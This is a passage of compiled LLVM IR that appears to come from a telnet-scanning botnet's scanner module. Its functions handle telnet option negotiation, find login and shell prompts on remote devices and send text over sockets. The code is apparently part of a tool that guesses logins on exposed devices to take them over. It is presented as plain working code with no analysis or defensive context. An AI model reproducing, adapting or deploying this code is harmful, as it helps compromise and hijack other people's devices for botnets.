declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #3

; Function Attrs: noinline nounwind uwtable
define i32 @recv_strip_null(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  %11 = load i32, i32* %5, align 4
  %12 = load i8*, i8** %6, align 8
  %13 = load i32, i32* %7, align 4
  %14 = sext i32 %13 to i64
  %15 = load i32, i32* %8, align 4
  %16 = call i64 @recv(i32 %11, i8* %12, i64 %14, i32 %15)
  %17 = trunc i64 %16 to i32
  store i32 %17, i32* %9, align 4
  %18 = load i32, i32* %9, align 4
  %19 = icmp sgt i32 %18, 0
  br i1 %19, label %20, label %43

; <label>:20:                                     ; preds = %4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  br label %21

; <label>:21:                                     ; preds = %39, %20
  %22 = load i32, i32* %10, align 4
  %23 = load i32, i32* %9, align 4
  %24 = icmp slt i32 %22, %23
  br i1 %24, label %25, label %42

; <label>:25:                                     ; preds = %21
  %26 = load i8*, i8** %6, align 8
  %27 = load i32, i32* %10, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds i8, i8* %26, i64 %28
  %30 = load i8, i8* %29, align 1
  %31 = sext i8 %30 to i32
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %33, label %38

; <label>:33:                                     ; preds = %25
  %34 = load i8*, i8** %6, align 8
  %35 = load i32, i32* %10, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds i8, i8* %34, i64 %36
  store i8 65, i8* %37, align 1
  br label %38

; <label>:38:                                     ; preds = %33, %25
  br label %39

; <label>:39:                                     ; preds = %38
  %40 = load i32, i32* %10, align 4
  %41 = add nsw i32 %40, 1
  store i32 %41, i32* %10, align 4
  br label %21

; <label>:42:                                     ; preds = %21
  br label %43

; <label>:43:                                     ; preds = %42, %4
  %44 = load i32, i32* %9, align 4
  ret i32 %44
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_iacs(%struct.scanner_connection*) #0 {
  %2 = alloca %struct.scanner_connection*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca [3 x i8], align 1
  %7 = alloca [9 x i8], align 1
  store %struct.scanner_connection* %0, %struct.scanner_connection** %2, align 8
  store i32 0, i32* %3, align 4
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [8192 x i8], [8192 x i8]* %9, i32 0, i32 0
  store i8* %10, i8** %4, align 8
  br label %11

; <label>:11:                                     ; preds = %136, %40, %1
  %12 = load i32, i32* %3, align 4
  %13 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %14 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %13, i32 0, i32 4
  %15 = load i32, i32* %14, align 8
  %16 = icmp slt i32 %12, %15
  br i1 %16, label %17, label %137

; <label>:17:                                     ; preds = %11
  %18 = load i8*, i8** %4, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp ne i32 %20, 255
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %17
  br label %137

; <label>:23:                                     ; preds = %17
  %24 = load i8*, i8** %4, align 8
  %25 = load i8, i8* %24, align 1
  %26 = zext i8 %25 to i32
  %27 = icmp eq i32 %26, 255
  br i1 %27, label %28, label %135

; <label>:28:                                     ; preds = %23
  %29 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %30 = load i8*, i8** %4, align 8
  %31 = call signext i8 @can_consume(%struct.scanner_connection* %29, i8* %30, i32 1)
  %32 = icmp ne i8 %31, 0
  br i1 %32, label %34, label %33

; <label>:33:                                     ; preds = %28
  br label %137

; <label>:34:                                     ; preds = %28
  %35 = load i8*, i8** %4, align 8
  %36 = getelementptr inbounds i8, i8* %35, i64 1
  %37 = load i8, i8* %36, align 1
  %38 = zext i8 %37 to i32
  %39 = icmp eq i32 %38, 255
  br i1 %39, label %40, label %45

; <label>:40:                                     ; preds = %34
  %41 = load i8*, i8** %4, align 8
  %42 = getelementptr inbounds i8, i8* %41, i64 2
  store i8* %42, i8** %4, align 8
  %43 = load i32, i32* %3, align 4
  %44 = add nsw i32 %43, 2
  store i32 %44, i32* %3, align 4
  br label %11

; <label>:45:                                     ; preds = %34
  %46 = load i8*, i8** %4, align 8
  %47 = getelementptr inbounds i8, i8* %46, i64 1
  %48 = load i8, i8* %47, align 1
  %49 = zext i8 %48 to i32
  %50 = icmp eq i32 %49, 253
  br i1 %50, label %51, label %81

; <label>:51:                                     ; preds = %45
  %52 = bitcast [3 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %52, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @consume_iacs.tmp1, i32 0, i32 0), i64 3, i32 1, i1 false)
  %53 = bitcast [9 x i8]* %7 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %53, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @consume_iacs.tmp2, i32 0, i32 0), i64 9, i32 1, i1 false)
  %54 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %55 = load i8*, i8** %4, align 8
  %56 = call signext i8 @can_consume(%struct.scanner_connection* %54, i8* %55, i32 2)
  %57 = icmp ne i8 %56, 0
  br i1 %57, label %59, label %58

; <label>:58:                                     ; preds = %51
  br label %137

; <label>:59:                                     ; preds = %51
  %60 = load i8*, i8** %4, align 8
  %61 = getelementptr inbounds i8, i8* %60, i64 2
  %62 = load i8, i8* %61, align 1
  %63 = zext i8 %62 to i32
  %64 = icmp ne i32 %63, 31
  br i1 %64, label %65, label %66

; <label>:65:                                     ; preds = %59
  br label %82

; <label>:66:                                     ; preds = %59
  %67 = load i8*, i8** %4, align 8
  %68 = getelementptr inbounds i8, i8* %67, i64 3
  store i8* %68, i8** %4, align 8
  %69 = load i32, i32* %3, align 4
  %70 = add nsw i32 %69, 3
  store i32 %70, i32* %3, align 4
  %71 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %72 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %71, i32 0, i32 2
  %73 = load i32, i32* %72, align 8
  %74 = getelementptr inbounds [3 x i8], [3 x i8]* %6, i32 0, i32 0
  %75 = call i64 @send(i32 %73, i8* %74, i64 3, i32 16384)
  %76 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %77 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %76, i32 0, i32 2
  %78 = load i32, i32* %77, align 8
  %79 = getelementptr inbounds [9 x i8], [9 x i8]* %7, i32 0, i32 0
  %80 = call i64 @send(i32 %78, i8* %79, i64 9, i32 16384)
  br label %133

; <label>:81:                                     ; preds = %45
  br label %82

; <label>:82:                                     ; preds = %81, %65
  %83 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %84 = load i8*, i8** %4, align 8
  %85 = call signext i8 @can_consume(%struct.scanner_connection* %83, i8* %84, i32 2)
  %86 = icmp ne i8 %85, 0
  br i1 %86, label %88, label %87

; <label>:87:                                     ; preds = %82
  br label %137

; <label>:88:                                     ; preds = %82
  store i32 0, i32* %5, align 4
  br label %89

; <label>:89:                                     ; preds = %120, %88
  %90 = load i32, i32* %5, align 4
  %91 = icmp slt i32 %90, 3
  br i1 %91, label %92, label %123

; <label>:92:                                     ; preds = %89
  %93 = load i8*, i8** %4, align 8
  %94 = load i32, i32* %5, align 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds i8, i8* %93, i64 %95
  %97 = load i8, i8* %96, align 1
  %98 = zext i8 %97 to i32
  %99 = icmp eq i32 %98, 253
  br i1 %99, label %100, label %105

; <label>:100:                                    ; preds = %92
  %101 = load i8*, i8** %4, align 8
  %102 = load i32, i32* %5, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds i8, i8* %101, i64 %103
  store i8 -4, i8* %104, align 1
  br label %119

; <label>:105:                                    ; preds = %92
  %106 = load i8*, i8** %4, align 8
  %107 = load i32, i32* %5, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds i8, i8* %106, i64 %108
  %110 = load i8, i8* %109, align 1
  %111 = zext i8 %110 to i32
  %112 = icmp eq i32 %111, 251
  br i1 %112, label %113, label %118

; <label>:113:                                    ; preds = %105
  %114 = load i8*, i8** %4, align 8
  %115 = load i32, i32* %5, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds i8, i8* %114, i64 %116
  store i8 -3, i8* %117, align 1
  br label %118

; <label>:118:                                    ; preds = %113, %105
  br label %119

; <label>:119:                                    ; preds = %118, %100
  br label %120

; <label>:120:                                    ; preds = %119
  %121 = load i32, i32* %5, align 4
  %122 = add nsw i32 %121, 1
  store i32 %122, i32* %5, align 4
  br label %89

; <label>:123:                                    ; preds = %89
  %124 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %125 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %124, i32 0, i32 2
  %126 = load i32, i32* %125, align 8
  %127 = load i8*, i8** %4, align 8
  %128 = call i64 @send(i32 %126, i8* %127, i64 3, i32 16384)
  %129 = load i8*, i8** %4, align 8
  %130 = getelementptr inbounds i8, i8* %129, i64 3
  store i8* %130, i8** %4, align 8
  %131 = load i32, i32* %3, align 4
  %132 = add nsw i32 %131, 3
  store i32 %132, i32* %3, align 4
  br label %133

; <label>:133:                                    ; preds = %123, %66
  br label %134

; <label>:134:                                    ; preds = %133
  br label %135

; <label>:135:                                    ; preds = %134, %23
  br label %136

; <label>:136:                                    ; preds = %135
  br label %11

; <label>:137:                                    ; preds = %87, %58, %33, %22, %11
  %138 = load i32, i32* %3, align 4
  ret i32 %138
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_login_prompt(%struct.scanner_connection*, i32) #0 {
  %3 = alloca i32, align 4
  %4 = alloca %struct.scanner_connection*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 -1, i32* %8, align 4
  %9 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %10 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %9, i32 0, i32 4
  %11 = load i32, i32* %10, align 8
  %12 = sub nsw i32 %11, 1
  store i32 %12, i32* %6, align 4
  br label %13

; <label>:13:                                     ; preds = %68, %2
  %14 = load i32, i32* %6, align 4
  %15 = icmp sgt i32 %14, 0
  br i1 %15, label %16, label %71

; <label>:16:                                     ; preds = %13
  %17 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %18 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %17, i32 0, i32 7
  %19 = load i32, i32* %6, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds [8192 x i8], [8192 x i8]* %18, i64 0, i64 %20
  %22 = load i8, i8* %21, align 1
  %23 = sext i8 %22 to i32
  %24 = icmp eq i32 %23, 58
  br i1 %24, label %64, label %25

; <label>:25:                                     ; preds = %16
  %26 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %27 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %26, i32 0, i32 7
  %28 = load i32, i32* %6, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [8192 x i8], [8192 x i8]* %27, i64 0, i64 %29
  %31 = load i8, i8* %30, align 1
  %32 = sext i8 %31 to i32
  %33 = icmp eq i32 %32, 62
  br i1 %33, label %64, label %34

; <label>:34:                                     ; preds = %25
  %35 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %36 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %35, i32 0, i32 7
  %37 = load i32, i32* %6, align 4
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds [8192 x i8], [8192 x i8]* %36, i64 0, i64 %38
  %40 = load i8, i8* %39, align 1
  %41 = sext i8 %40 to i32
  %42 = icmp eq i32 %41, 36
  br i1 %42, label %64, label %43

; <label>:43:                                     ; preds = %34
  %44 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %45 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %44, i32 0, i32 7
  %46 = load i32, i32* %6, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds [8192 x i8], [8192 x i8]* %45, i64 0, i64 %47
  %49 = load i8, i8* %48, align 1
  %50 = sext i8 %49 to i32
  %51 = icmp eq i32 %50, 35
  br i1 %51, label %64, label %52

; <label>:52:                                     ; preds = %43
  %53 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %54 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %53, i32 0, i32 7
  %55 = load i32, i32* %6, align 4
  %56 = sext i32 %55 to i64
  %57 = getelementptr inbounds [8192 x i8], [8192 x i8]* %54, i64 0, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = sext i8 %58 to i32
  %60 = icmp eq i32 %59, 37
  br i1 %60, label %61, label %67

; <label>:61:                                     ; preds = %52
  %62 = load i32, i32* %5, align 4
  %63 = icmp eq i32 %62, 1
  br i1 %63, label %64, label %67

; <label>:64:                                     ; preds = %61, %43, %34, %25, %16
  %65 = load i32, i32* %6, align 4
  %66 = add nsw i32 %65, 1
  store i32 %66, i32* %8, align 4
  br label %71

; <label>:67:                                     ; preds = %61, %52
  br label %68

; <label>:68:                                     ; preds = %67
  %69 = load i32, i32* %6, align 4
  %70 = add nsw i32 %69, -1
  store i32 %70, i32* %6, align 4
  br label %13

; <label>:71:                                     ; preds = %64, %13
  %72 = load i32, i32* %8, align 4
  %73 = icmp eq i32 %72, -1
  br i1 %73, label %74, label %126

; <label>:74:                                     ; preds = %71
  %75 = load i32, i32* %5, align 4
  %76 = icmp eq i32 %75, 1
  br i1 %76, label %77, label %113

; <label>:77:                                     ; preds = %74
  %78 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %79 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %78, i32 0, i32 7
  %80 = getelementptr inbounds [8192 x i8], [8192 x i8]* %79, i32 0, i32 0
  %81 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %82 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %81, i32 0, i32 4
  %83 = load i32, i32* %82, align 8
  %84 = call i32 @util_memsearch(i8* %80, i32 %83, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.144, i32 0, i32 0), i32 4)
  store i32 %84, i32* %7, align 4
  %85 = icmp ne i32 %84, -1
  br i1 %85, label %86, label %88

; <label>:86:                                     ; preds = %77
  %87 = load i32, i32* %7, align 4
  store i32 %87, i32* %8, align 4
  br label %112

; <label>:88:                                     ; preds = %77
  %89 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %90 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %89, i32 0, i32 7
  %91 = getelementptr inbounds [8192 x i8], [8192 x i8]* %90, i32 0, i32 0
  %92 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %93 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %92, i32 0, i32 4
  %94 = load i32, i32* %93, align 8
  %95 = call i32 @util_memsearch(i8* %91, i32 %94, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.145, i32 0, i32 0), i32 5)
  store i32 %95, i32* %7, align 4
  %96 = icmp ne i32 %95, -1
  br i1 %96, label %97, label %99

; <label>:97:                                     ; preds = %88
  %98 = load i32, i32* %7, align 4
  store i32 %98, i32* %8, align 4
  br label %111

; <label>:99:                                     ; preds = %88
  %100 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %101 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %100, i32 0, i32 7
  %102 = getelementptr inbounds [8192 x i8], [8192 x i8]* %101, i32 0, i32 0
  %103 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %104 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %103, i32 0, i32 4
  %105 = load i32, i32* %104, align 8
  %106 = call i32 @util_memsearch(i8* %102, i32 %105, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.146, i32 0, i32 0), i32 3)
  store i32 %106, i32* %7, align 4
  %107 = icmp ne i32 %106, -1
  br i1 %107, label %108, label %110

; <label>:108:                                    ; preds = %99
  %109 = load i32, i32* %7, align 4
  store i32 %109, i32* %8, align 4
  br label %110

; <label>:110:                                    ; preds = %108, %99
  br label %111

; <label>:111:                                    ; preds = %110, %97
  br label %112

; <label>:112:                                    ; preds = %111, %86
  br label %125

; <label>:113:                                    ; preds = %74
  %114 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %115 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %114, i32 0, i32 7
  %116 = getelementptr inbounds [8192 x i8], [8192 x i8]* %115, i32 0, i32 0
  %117 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %118 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %117, i32 0, i32 4
  %119 = load i32, i32* %118, align 8
  %120 = call i32 @util_memsearch(i8* %116, i32 %119, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.147, i32 0, i32 0), i32 7)
  store i32 %120, i32* %7, align 4
  %121 = icmp ne i32 %120, -1
  br i1 %121, label %122, label %124

; <label>:122:                                    ; preds = %113
  %123 = load i32, i32* %7, align 4
  store i32 %123, i32* %8, align 4
  br label %124

; <label>:124:                                    ; preds = %122, %113
  br label %125

; <label>:125:                                    ; preds = %124, %112
  br label %126

; <label>:126:                                    ; preds = %125, %71
  %127 = load i32, i32* %8, align 4
  %128 = icmp eq i32 %127, -1
  br i1 %128, label %129, label %130

; <label>:129:                                    ; preds = %126
  store i32 0, i32* %3, align 4
  br label %132

; <label>:130:                                    ; preds = %126
  %131 = load i32, i32* %8, align 4
  store i32 %131, i32* %3, align 4
  br label %132

; <label>:132:                                    ; preds = %130, %129
  %133 = load i32, i32* %3, align 4
  ret i32 %133
}

; Function Attrs: noinline nounwind uwtable
define i32 @fdsend(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca [5026 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca [1 x %struct.__va_list_tag], align 16
  store i32 %0, i32* %4, align 4
  store i8* %1, i8** %5, align 8
  store i32 0, i32* %7, align 4
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %8, i32 0, i32 0
  %10 = bitcast %struct.__va_list_tag* %9 to i8*
  call void @llvm.va_start(i8* %10)
  %11 = getelementptr inbounds [5026 x i8], [5026 x i8]* %6, i32 0, i32 0
  %12 = load i8*, i8** %5, align 8
  %13 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %8, i32 0, i32 0
  %14 = call i32 @vsprintf(i8* %11, i8* %12, %struct.__va_list_tag* %13) #7
  store i32 %14, i32* %7, align 4
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %8, i32 0, i32 0
  %16 = bitcast %struct.__va_list_tag* %15 to i8*
  call void @llvm.va_end(i8* %16)
  %17 = load i32, i32* %4, align 4
  %18 = getelementptr inbounds [5026 x i8], [5026 x i8]* %6, i32 0, i32 0
  %19 = load i32, i32* %7, align 4
  %20 = sext i32 %19 to i64
  %21 = call i64 @send(i32 %17, i8* %18, i64 %20, i32 16384)
  %22 = load i32, i32* %7, align 4
  %23 = sext i32 %22 to i64
  %24 = icmp ne i64 %21, %23
  br i1 %24, label %25, label %26

; <label>:25:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %29

; <label>:26:                                     ; preds = %2
  %27 = load i32, i32* %4, align 4
  %28 = call i64 @send(i32 %27, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i32 0, i32 0), i64 2, i32 16384)
  store i32 1, i32* %3, align 4
  br label %29

; <label>:29:                                     ; preds = %26, %25
  %30 = load i32, i32* %3, align 4
  ret i32 %30
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_shell_prompt(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 -1, i32* %5, align 4
  %6 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %7 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %6, i32 0, i32 7
  %8 = getelementptr inbounds [8192 x i8], [8192 x i8]* %7, i32 0, i32 0
  %9 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %10 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %9, i32 0, i32 4
  %11 = load i32, i32* %10, align 8
  %12 = call i32 @util_memsearch(i8* %8, i32 %11, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.139, i32 0, i32 0), i32 8)
  %13 = icmp ne i32 %12, -1
  br i1 %13, label %14, label %15

; <label>:14:                                     ; preds = %1
  store i32 -1, i32* %2, align 4
  br label %147

; <label>:15:                                     ; preds = %1
  %16 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %17 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %16, i32 0, i32 7
  %18 = getelementptr inbounds [8192 x i8], [8192 x i8]* %17, i32 0, i32 0
  %19 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %20 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %19, i32 0, i32 4
  %21 = load i32, i32* %20, align 8
  %22 = call i32 @util_memsearch(i8* %18, i32 %21, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.140, i32 0, i32 0), i32 6)
  %23 = icmp ne i32 %22, -1
  br i1 %23, label %24, label %25

; <label>:24:                                     ; preds = %15
  store i32 -1, i32* %2, align 4
  br label %147

; <label>:25:                                     ; preds = %15
  %26 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %27 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %26, i32 0, i32 7
  %28 = getelementptr inbounds [8192 x i8], [8192 x i8]* %27, i32 0, i32 0
  %29 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %30 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %29, i32 0, i32 4
  %31 = load i32, i32* %30, align 8
  %32 = call i32 @util_memsearch(i8* %28, i32 %31, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.141, i32 0, i32 0), i32 9)
  %33 = icmp ne i32 %32, -1
  br i1 %33, label %34, label %35

; <label>:34:                                     ; preds = %25
  store i32 -1, i32* %2, align 4
  br label %147

; <label>:35:                                     ; preds = %25
  %36 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %37 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %36, i32 0, i32 7
  %38 = getelementptr inbounds [8192 x i8], [8192 x i8]* %37, i32 0, i32 0
  %39 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %40 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %39, i32 0, i32 4
  %41 = load i32, i32* %40, align 8
  %42 = call i32 @util_memsearch(i8* %38, i32 %41, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.142, i32 0, i32 0), i32 14)
  %43 = icmp ne i32 %42, -1
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %35
  store i32 -1, i32* %2, align 4
  br label %147

; <label>:45:                                     ; preds = %35
  %46 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %47 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %46, i32 0, i32 7
  %48 = getelementptr inbounds [8192 x i8], [8192 x i8]* %47, i32 0, i32 0
  %49 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %50 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %49, i32 0, i32 4
  %51 = load i32, i32* %50, align 8
  %52 = call i32 @util_memsearch(i8* %48, i32 %51, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.143, i32 0, i32 0), i32 5)
  %53 = icmp ne i32 %52, -1
  br i1 %53, label %54, label %55

; <label>:54:                                     ; preds = %45
  store i32 -1, i32* %2, align 4
  br label %147

; <label>:55:                                     ; preds = %45
  br label %56

; <label>:56:                                     ; preds = %55
  br label %57

; <label>:57:                                     ; preds = %56
  br label %58

; <label>:58:                                     ; preds = %57
  br label %59

; <label>:59:                                     ; preds = %58
  %60 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %61 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %60, i32 0, i32 4
  %62 = load i32, i32* %61, align 8
  %63 = sub nsw i32 %62, 1
  store i32 %63, i32* %4, align 4
  br label %64

; <label>:64:                                     ; preds = %134, %59
  %65 = load i32, i32* %4, align 4
  %66 = icmp sgt i32 %65, 0
  br i1 %66, label %67, label %137

; <label>:67:                                     ; preds = %64
  %68 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %69 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %68, i32 0, i32 7
  %70 = load i32, i32* %4, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds [8192 x i8], [8192 x i8]* %69, i64 0, i64 %71
  %73 = load i8, i8* %72, align 1
  %74 = sext i8 %73 to i32
  %75 = icmp eq i32 %74, 58
  br i1 %75, label %130, label %76

; <label>:76:                                     ; preds = %67
  %77 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %78 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %77, i32 0, i32 7
  %79 = load i32, i32* %4, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds [8192 x i8], [8192 x i8]* %78, i64 0, i64 %80
  %82 = load i8, i8* %81, align 1
  %83 = sext i8 %82 to i32
  %84 = icmp eq i32 %83, 62
  br i1 %84, label %130, label %85

; <label>:85:                                     ; preds = %76
  %86 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %87 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %86, i32 0, i32 7
  %88 = load i32, i32* %4, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds [8192 x i8], [8192 x i8]* %87, i64 0, i64 %89
  %91 = load i8, i8* %90, align 1
  %92 = sext i8 %91 to i32
  %93 = icmp eq i32 %92, 36
  br i1 %93, label %130, label %94

; <label>:94:                                     ; preds = %85
  %95 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %96 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %95, i32 0, i32 7
  %97 = load i32, i32* %4, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds [8192 x i8], [8192 x i8]* %96, i64 0, i64 %98
  %100 = load i8, i8* %99, align 1
  %101 = sext i8 %100 to i32
  %102 = icmp eq i32 %101, 35
  br i1 %102, label %130, label %103

; <label>:103:                                    ; preds = %94
  %104 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %105 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %104, i32 0, i32 7
  %106 = load i32, i32* %4, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds [8192 x i8], [8192 x i8]* %105, i64 0, i64 %107
  %109 = load i8, i8* %108, align 1
  %110 = sext i8 %109 to i32
  %111 = icmp eq i32 %110, 37
  br i1 %111, label %130, label %112

; <label>:112:                                    ; preds = %103
  %113 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %114 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %113, i32 0, i32 7
  %115 = load i32, i32* %4, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds [8192 x i8], [8192 x i8]* %114, i64 0, i64 %116
  %118 = load i8, i8* %117, align 1
  %119 = sext i8 %118 to i32
  %120 = icmp eq i32 %119, 93
  br i1 %120, label %130, label %121

; <label>:121:                                    ; preds = %112
  %122 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %123 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %122, i32 0, i32 7
  %124 = load i32, i32* %4, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds [8192 x i8], [8192 x i8]* %123, i64 0, i64 %125
  %127 = load i8, i8* %126, align 1
  %128 = sext i8 %127 to i32
  %129 = icmp eq i32 %128, 126
  br i1 %129, label %130, label %133

; <label>:130:                                    ; preds = %121, %112, %103, %94, %85, %76, %67
  %131 = load i32, i32* %4, align 4
  %132 = add nsw i32 %131, 1
  store i32 %132, i32* %5, align 4
  br label %137

; <label>:133:                                    ; preds = %121
  br label %134

; <label>:134:                                    ; preds = %133
  %135 = load i32, i32* %4, align 4
  %136 = add nsw i32 %135, -1
  store i32 %136, i32* %4, align 4
  br label %64

; <label>:137:                                    ; preds = %130, %64
  %138 = load i32, i32* %5, align 4
